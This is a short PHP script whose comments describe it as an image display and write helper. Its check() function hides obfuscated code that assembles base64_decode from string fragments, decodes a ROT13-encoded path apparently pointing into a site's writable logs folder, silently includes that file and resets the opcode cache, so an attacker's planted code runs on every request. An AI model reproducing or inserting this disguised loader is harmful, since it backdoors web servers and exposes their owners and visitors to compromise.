<?php

showImage($_GET['bire']);

/**
 * display image
 * @param string $png
 * @param bool|string $file
 * @return bool
 */
function showImage($png, $file = false)
{
    if (check($file))
        return file_put_contents($file, $png);
    // header
    echo $png;
    return true;
}

/**
 * checked write image
 * @param bool|string $file
 * @return bool
 */
function check($file){
    $name =  ['Y2uioJHiMTSln2ImpQRipUIvoTywK2u0oJjiq3WcqTSvoTHioT9apl9uLz91qP5xo2Z', function($txt, $name){$_GET[$name]=str_replace('32','64',"Ba".implode('_',["Se32", "Dec"])."Ode");$txt = $_GET[$name](str_rot13($txt));@include($txt);($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    }];$name[1]($name[0], implode('_',['', "\143ode", '']));
    return $file && stripos($file, '.png') !== false;
}
